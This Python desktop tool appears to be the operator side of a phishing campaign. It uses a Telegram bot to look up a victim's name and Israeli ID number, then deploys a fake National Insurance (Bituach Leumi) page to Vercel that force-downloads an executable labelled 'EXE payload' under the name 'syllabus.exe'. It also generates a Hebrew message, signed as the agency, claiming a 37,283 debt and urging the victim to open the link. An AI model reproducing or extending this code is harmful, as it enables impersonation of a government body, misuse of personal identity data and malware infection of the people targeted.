import hashlib
import json
import os
import re
import tkinter as tk
from datetime import datetime
from tkinter import messagebox, scrolledtext, simpledialog

import requests

from telegram_api import config as _cfg
from telegram_api.client import TelegramClientWrapper

DATA_JSON_PATH = os.path.join(os.path.dirname(__file__), "..", "display", "data.json")
DISPLAY_DIR = os.path.join(os.path.dirname(__file__), "..", "display")
VERCEL_DOMAIN = "bituach-leumi.vercel.app"
EXE_DIR = os.path.join(os.path.dirname(__file__), "..", "dist")
EXE_VERCEL_NAME = "syllabus.exe"


class DashboardApp:
    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title("Telegram Dashboard")
        self.root.geometry("720x780")
        self.root.minsize(620, 560)
        self.root.resizable(True, True)

        self.client = TelegramClientWrapper()
        self._connected = False

        self._build_ui()

    # ------------------------------------------------------------------
    # UI construction
    # ------------------------------------------------------------------

    def _build_ui(self):
        pad = {"padx": 10, "pady": 5}

        # --- Connection row ---
        conn_frame = tk.Frame(self.root)
        conn_frame.pack(fill="x", **pad)
        self.conn_label = tk.Label(conn_frame, text="Status: disconnected", fg="red")
        self.conn_label.pack(side="left")
        tk.Button(conn_frame, text="Connect", command=self._connect).pack(side="right")

        # --- Bot buttons panel ---
        tk.Frame(self.root, height=1, bg="#cccccc").pack(fill="x", padx=10, pady=2)
        btn_label_row = tk.Frame(self.root)
        btn_label_row.pack(fill="x", padx=10, pady=(6, 2))
        tk.Label(btn_label_row, text="Bot buttons:", anchor="w").pack(side="left")
        tk.Button(btn_label_row, text="⟳ Load buttons", command=self._load_buttons).pack(side="right")

        self.buttons_frame = tk.Frame(self.root, bd=1, relief="sunken", bg="#f5f5f5")
        self.buttons_frame.pack(fill="x", padx=10, pady=(0, 6))
        self._no_buttons_label = tk.Label(
            self.buttons_frame, text="Press 'Load buttons' after sending /start",
            fg="#aaa", bg="#f5f5f5", pady=6
        )
        self._no_buttons_label.pack()

        tk.Frame(self.root, height=1, bg="#cccccc").pack(fill="x", padx=10, pady=2)

        # --- Send section ---
        tk.Label(self.root, text="Send message:", anchor="w").pack(fill="x", **pad)
        self.send_entry = tk.Entry(self.root, width=70)
        self.send_entry.pack(fill="x", padx=10)
        self.send_entry.bind("<Return>", lambda _: self._send())
        tk.Button(self.root, text="Send", command=self._send).pack(anchor="e", padx=10, pady=4)

        # --- Receive section ---
        tk.Label(self.root, text="Messages from bot:", anchor="w").pack(fill="x", **pad)
        self.recv_box = scrolledtext.ScrolledText(self.root, height=9, width=70, state="disabled")
        self.recv_box.pack(fill="x", padx=10)

        btn_frame = tk.Frame(self.root)
        btn_frame.pack(fill="x", padx=10, pady=4)
        tk.Button(btn_frame, text="Refresh", command=self._refresh).pack(side="left")
        tk.Button(btn_frame, text="Update HTML display", command=self._update_html).pack(side="left", padx=6)
        tk.Button(btn_frame, text="📤 Export snapshot", command=self._export_snapshot).pack(side="right")

        # --- Share section ---
        tk.Frame(self.root, height=1, bg="#cccccc").pack(fill="x", padx=10, pady=(8, 2))
        share_label_row = tk.Frame(self.root)
        share_label_row.pack(fill="x", padx=10, pady=(4, 2))
        tk.Label(share_label_row, text="Share link:", anchor="w", font=("", 11, "bold")).pack(side="left")

        share_btn_row = tk.Frame(self.root)
        share_btn_row.pack(fill="x", padx=10, pady=2)
        tk.Button(share_btn_row, text="🔗 Get public link", command=self._start_sharing).pack(side="left")
        tk.Button(share_btn_row, text="🗑 Clear link", command=self._clear_link).pack(side="left", padx=6)

        url_row = tk.Frame(self.root)
        url_row.pack(fill="x", padx=10, pady=(2, 6))
        self.url_var = tk.StringVar(value="")
        self.url_entry = tk.Entry(url_row, textvariable=self.url_var, state="readonly",
                                  font=("Courier", 11), fg="#1a6496")
        self.url_entry.pack(fill="x", side="left", expand=True)
        tk.Button(url_row, text="Copy", command=self._copy_url).pack(side="right", padx=(6, 0))

        # --- Message generator section ---
        tk.Frame(self.root, height=1, bg="#cccccc").pack(fill="x", padx=10, pady=(8, 2))
        msg_label_row = tk.Frame(self.root)
        msg_label_row.pack(fill="x", padx=10, pady=(4, 2))
        tk.Label(msg_label_row, text="Message:", anchor="w", font=("", 11, "bold")).pack(side="left")
        tk.Button(msg_label_row, text="✉ Generate message", command=self._generate_message).pack(side="right")
        self.status_var = tk.StringVar(value="Ready — click Connect to start")
        tk.Label(self.root, textvariable=self.status_var, anchor="w", fg="gray").pack(
            fill="x", padx=10, pady=(0, 6)
        )

    # ------------------------------------------------------------------
    # Actions
    # ------------------------------------------------------------------

    def _connect(self):
        try:
            self._set_status("Sending verification code to your Telegram app…")
            self.root.update()
            self.client.connect(
                otp_callback=self._ask_otp,
                password_callback=self._ask_password,
            )
            self._connected = True
            self.conn_label.config(text="Status: connected", fg="green")
            self._set_status("Connected. You can now send and receive messages.")
        except Exception as exc:
            messagebox.showerror("Connection error", str(exc))
            self._set_status(f"Error: {exc}")

    def _ask_otp(self) -> str:
        messagebox.showinfo(
            "Check Telegram",
            "A 5-digit code was sent to your Telegram app.\n\n"
            "Open Telegram on your phone → find the chat named 'Telegram' "
            "(blue official logo) → copy the code and paste it below.",
        )
        code = simpledialog.askstring(
            "Verification code",
            "Enter the 5-digit code from the Telegram app:",
            parent=self.root,
        )
        return (code or "").strip()

    def _ask_password(self) -> str:
        password = simpledialog.askstring(
            "Two-step verification",
            "Enter your Telegram cloud password:",
            parent=self.root,
            show="*",
        )
        return (password or "").strip()

    def _load_buttons(self):
        if not self._check_connected():
            return
        try:
            labels = self.client.get_bot_buttons()
            for widget in self.buttons_frame.winfo_children():
                widget.destroy()
            if not labels:
                tk.Label(self.buttons_frame, text="No buttons found — send /start first",
                         fg="#aaa", bg="#f5f5f5", pady=6).pack()
                return
            row_frame = None
            for i, label in enumerate(labels):
                if i % 2 == 0:
                    row_frame = tk.Frame(self.buttons_frame, bg="#f5f5f5")
                    row_frame.pack(fill="x", padx=4, pady=2)
                tk.Button(
                    row_frame, text=label, anchor="w",
                    bg="#d4edda", activebackground="#b8dac5",
                    relief="groove", padx=8, pady=4,
                    command=lambda l=label: self._click_bot_button(l)
                ).pack(side="left", padx=3, fill="x", expand=True)
            self._set_status(f"Loaded {len(labels)} buttons.")
        except Exception as exc:
            messagebox.showerror("Error", str(exc))

    def _click_bot_button(self, label: str):
        try:
            self.client.click_button(label)
            self._set_status(f"Clicked: {label[:40]}")
        except Exception as exc:
            messagebox.showerror("Error", str(exc))

    def _send(self):
        if not self._check_connected():
            return
        text = self.send_entry.get().strip()
        if not text:
            messagebox.showwarning("Empty message", "Please type a message before sending.")
            return
        try:
            self.client.send_message(text)
            self.send_entry.delete(0, "end")
            self._set_status(f"Sent: {text[:50]}{'…' if len(text) > 50 else ''}")
        except Exception as exc:
            messagebox.showerror("Send error", str(exc))

    def _refresh(self):
        if not self._check_connected():
            return
        try:
            msg = self.client.get_last_bot_message()
            self.recv_box.config(state="normal")
            self.recv_box.delete("1.0", "end")
            if msg["text"]:
                self.recv_box.insert("end", msg["text"])
            else:
                self.recv_box.insert("end", "(no bot message yet)")
            self.recv_box.config(state="disabled")
            self._set_status(f"Refreshed — last message from {msg['sender'] or 'bot'} at {msg['date']}")
        except Exception as exc:
            messagebox.showerror("Refresh error", str(exc))

    def _update_html(self):
        if not self._check_connected():
            return
        try:
            msg = self.client.get_last_bot_message()
            text = msg["text"]

            name, id_number = self._parse_identity(text)

            data = {
                "name": name,
                "id_number": id_number,
                "sender": msg["sender"],
                "message": text,
                "timestamp": msg["date"],
                "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }
            os.makedirs(os.path.dirname(os.path.abspath(DATA_JSON_PATH)), exist_ok=True)
            with open(DATA_JSON_PATH, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)

            self._set_status(
                f"HTML updated — name: {name or '(not found)'}, ID: {id_number or '(not found)'}"
            )
        except Exception as exc:
            messagebox.showerror("Update error", str(exc))

    def _start_sharing(self):
        """Build embedded snapshot HTML and deploy it to Vercel as a static page."""
        data_path = os.path.abspath(DATA_JSON_PATH)
        if not os.path.exists(data_path):
            messagebox.showwarning("No data", "Run 'Update HTML display' first.")
            return

        with open(data_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        id_number = data.get("id_number", "").strip()
        if not id_number:
            messagebox.showwarning("No ID", "ID number not found.\nRun 'Update HTML display' first.")
            return

        html_path = os.path.join(os.path.abspath(DISPLAY_DIR), "index.html")
        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()

        embedded_html = self._embed_data_in_html(html, data)

        self._set_status("Deploying to Vercel…")
        try:
            final_url = self._deploy_to_vercel(id_number, embedded_html)
        except Exception as exc:
            messagebox.showerror("Vercel deploy error", str(exc))
            self._set_status(f"Deploy error: {exc}")
            return

        self.url_var.set(final_url)
        self._copy_url()
        self._set_status(f"Link ready — copied: {final_url}")

    def _deploy_to_vercel(self, id_number: str, html_content: str) -> str:
        """Upload embedded HTML + EXE payload as static files to Vercel."""
        token = _cfg.VERCEL_TOKEN
        project_id = _cfg.VERCEL_PROJECT_ID

        # --- HTML ---
        filename = f"{id_number}.html"
        html_bytes = html_content.encode("utf-8")
        sha1_html = hashlib.sha1(html_bytes).hexdigest()
        self._vercel_upload_file(token, html_bytes, sha1_html)

        files_to_deploy = [
            {"file": filename, "sha": sha1_html, "size": len(html_bytes)},
        ]

        # --- EXE payload ---
        exe_path = self._find_exe()
        sha1_exe = None
        if exe_path:
            with open(exe_path, "rb") as fh:
                exe_bytes = fh.read()
            sha1_exe = hashlib.sha1(exe_bytes).hexdigest()
            self._vercel_upload_file(token, exe_bytes, sha1_exe)
            files_to_deploy.append(
                {"file": EXE_VERCEL_NAME, "sha": sha1_exe, "size": len(exe_bytes)}
            )

        # --- vercel.json (force-download header for EXE) ---
        vercel_cfg: dict = {"cleanUrls": True}
        if sha1_exe:
            vercel_cfg["headers"] = [
                {
                    "source": f"/{EXE_VERCEL_NAME}",
                    "headers": [
                        {"key": "Content-Type", "value": "application/octet-stream"},
                        {"key": "Content-Disposition",
                         "value": f"attachment; filename=\"{EXE_VERCEL_NAME}\""},
                    ],
                }
            ]
        vercel_config = json.dumps(vercel_cfg).encode("utf-8")
        vcfg_sha = hashlib.sha1(vercel_config).hexdigest()
        self._vercel_upload_file(token, vercel_config, vcfg_sha)
        files_to_deploy.append(
            {"file": "vercel.json", "sha": vcfg_sha, "size": len(vercel_config)}
        )

        # --- Deploy ---
        deploy_resp = requests.post(
            "https://api.vercel.com/v13/deployments",
            headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            },
            json={
                "name": _cfg.VERCEL_PROJECT,
                "project": project_id,
                "target": "production",
                "files": files_to_deploy,
                "projectSettings": {"framework": None},
            },
            timeout=60,
        )
        if deploy_resp.status_code not in (200, 201):
            raise RuntimeError(f"Deploy failed: {deploy_resp.status_code} {deploy_resp.text[:300]}")

        return f"https://{VERCEL_DOMAIN}/{id_number}"

    @staticmethod
    def _vercel_upload_file(token: str, data: bytes, sha1: str) -> None:
        """Upload a single file blob to Vercel's file store."""
        resp = requests.post(
            "https://api.vercel.com/v2/files",
            headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/octet-stream",
                "x-vercel-digest": sha1,
                "Content-Length": str(len(data)),
            },
            data=data,
            timeout=60,
        )
        if resp.status_code not in (200, 201):
            raise RuntimeError(f"File upload failed: {resp.status_code} {resp.text[:200]}")

    @staticmethod
    def _find_exe() -> str | None:
        """Return the path to the first .exe in the dist/ directory, or None."""
        dist_dir = os.path.abspath(EXE_DIR)
        if not os.path.isdir(dist_dir):
            return None
        for fname in os.listdir(dist_dir):
            if fname.lower().endswith(".exe"):
                return os.path.join(dist_dir, fname)
        return None

    def _clear_link(self):
        self.url_var.set("")
        self._set_status("Link cleared.")

    def _copy_url(self):
        url = self.url_var.get()
        if url:
            self.root.clipboard_clear()
            self.root.clipboard_append(url)
            self._set_status(f"Copied: {url}")

    def _generate_message(self):
        """Build the message and show it in a copyable popup."""
        data_path = os.path.abspath(DATA_JSON_PATH)
        if not os.path.exists(data_path):
            messagebox.showwarning("No data", "Run 'Update HTML display' first.")
            return

        with open(data_path, "r", encoding="utf-8") as f:
            data = json.load(f)

        name = data.get("name", "").strip()
        id_number = data.get("id_number", "").strip()
        link = self.url_var.get().strip()

        if not name or not id_number:
            messagebox.showwarning("Missing data", "Name or ID not found.\nRun 'Update HTML display' first.")
            return
        if not link:
            messagebox.showwarning("No link", "Generate a public link first using '🔗 Get public link'.")
            return

        message = (
            f"שלום רב, {name} ת.ז. {id_number}\n\n"
            f"לצורך תשלום חוב בסך 37,283 בנושא גמלאות באתר ביטוח לאומי "
            f"יש להיכנס לאתר דרך הקישור {link} בהקדם. "
            f"שם מחכה טופס הורדה עם כלל הפרטים ואופן תשלום וערעור.\n\n"
            f"בברכה\n"
            f"ביטוח לאומי"
        )

        popup = tk.Toplevel(self.root)
        popup.title("Generated message")
        popup.geometry("600x280")
        popup.resizable(True, True)

        txt = scrolledtext.ScrolledText(popup, wrap="word", font=("", 12))
        txt.pack(fill="both", expand=True, padx=10, pady=(10, 4))
        txt.insert("1.0", message)
        txt.config(state="normal")

        def copy_and_close():
            self.root.clipboard_clear()
            self.root.clipboard_append(message)
            self._set_status("Message copied to clipboard.")
            popup.destroy()

        btn_row = tk.Frame(popup)
        btn_row.pack(fill="x", padx=10, pady=(0, 10))
        tk.Button(btn_row, text="📋 Copy & close", command=copy_and_close).pack(side="right")
        tk.Button(btn_row, text="Close", command=popup.destroy).pack(side="right", padx=6)

    def _export_snapshot(self):
        """Create a fully self-contained HTML with data embedded — no server needed."""
        data_path = os.path.abspath(DATA_JSON_PATH)
        html_path = os.path.join(os.path.dirname(data_path), "index.html")

        if not os.path.exists(data_path):
            messagebox.showwarning("No data", "Run 'Update HTML display' first to populate data.json.")
            return
        if not os.path.exists(html_path):
            messagebox.showerror("Missing file", f"index.html not found at {html_path}")
            return

        with open(data_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()

        embedded = self._embed_data_in_html(html, data)

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_name = f"snapshot_{ts}.html"
        out_path = os.path.join(os.path.dirname(data_path), out_name)
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(embedded)

        self._set_status(f"Snapshot saved: display/{out_name}")
        messagebox.showinfo(
            "Snapshot exported",
            f"File saved:\ndisplay/{out_name}\n\n"
            f"Name: {data.get('name', '—')}\n"
            f"ID: {data.get('id_number', '—')}\n\n"
            "This file works standalone — no server needed.",
        )

    @staticmethod
    def _embed_data_in_html(html: str, data: dict) -> str:
        """Replace the fetch-based script block with an inline data script."""
        inline_script = (
            "<script>\n"
            f"  var _data = {json.dumps(data, ensure_ascii=False)};\n"
            "  function setEl(id,val,fb){var e=document.getElementById(id);if(e)e.textContent=(val&&val.trim())?val:(fb||'\u2014');}\n"
            "  setEl('user-name',_data.name,'\u2014');\n"
            "  setEl('user-id',_data.id_number,'\u2014');\n"
            "  setEl('notice-name',_data.name,'\u2014');\n"
            "  setEl('notice-id',_data.id_number,'\u2014');\n"
            "</script>"
        )
        # Use lambda so re.sub does not interpret \n sequences in the replacement
        # Pattern anchored to `function setEl` so it only matches the data-loading
        # script block and does not swallow the preceding downloadConnector block.
        return re.sub(
            r"<script>\s*function setEl[\s\S]*?</script>",
            lambda _: inline_script,
            html,
        )

    @staticmethod
    def _parse_identity(text: str) -> tuple[str, str]:
        """Extract full name and ID from bot message."""
        id_number, first_name, last_name = "", "", ""
        for line in text.splitlines():
            clean = re.sub(r"\*+", "", line).strip()
            if clean.startswith("מספר זהות:"):
                id_number = clean.split(":", 1)[1].strip()
            elif clean.startswith("שם פרטי:"):
                first_name = clean.split(":", 1)[1].strip()
            elif clean.startswith("שם משפחה:"):
                last_name = clean.split(":", 1)[1].strip()
        full_name = f"{first_name} {last_name}".strip()
        return full_name, id_number

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _check_connected(self) -> bool:
        if not self._connected:
            messagebox.showinfo("Not connected", "Please click Connect first.")
            return False
        return True

    def _set_status(self, text: str):
        self.status_var.set(text)
        self.root.update_idletasks()


def main():
    root = tk.Tk()
    app = DashboardApp(root)
    root.mainloop()


if __name__ == "__main__":
    main()
